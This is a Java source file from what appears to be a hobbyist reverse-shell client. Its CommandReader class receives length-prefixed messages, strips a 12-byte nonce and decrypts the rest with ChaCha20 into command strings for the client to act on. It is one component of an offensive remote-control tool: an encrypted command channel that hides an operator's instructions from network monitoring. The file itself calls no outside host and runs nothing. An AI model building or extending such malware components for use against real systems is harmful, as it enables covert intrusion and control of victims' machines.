package obs1d1anc1ph3r.reverseshell.client.commandhandling;

import java.io.IOException;
import obs1d1anc1ph3r.reverseshell.client.encryption.ChaCha20;
import obs1d1anc1ph3r.reverseshell.client.utils.StreamHandler;

public class CommandReader {

	private final StreamHandler streamHandler;
	private final byte[] encryptionKey;

	public CommandReader(StreamHandler streamHandler, byte[] encryptionKey) {
		this.streamHandler = streamHandler;
		this.encryptionKey = encryptionKey;
	}

	//I'm illiterate, so I make computers read for me
	public String readCommand() throws IOException {
		int length = streamHandler.getDataIn().readInt();
		if (length <= 12) {
			throw new IOException("Invalid encrypted command length.");
		}

		byte[] nonce = new byte[12];
		byte[] encryptedCommand = new byte[length - 12];

		streamHandler.getDataIn().readFully(nonce);
		streamHandler.getDataIn().readFully(encryptedCommand);

		try {
			byte[] decryptedCommand = ChaCha20.decrypt(encryptionKey, nonce, encryptedCommand); //I need a math lesson on encryption stuff, especially ones that use eliptical curves
			return ChaCha20.bytesToString(decryptedCommand);
		} catch (Exception e) {
			throw new IOException("Failed to decrypt command", e); //Hopefully not needed
		}
	}

}
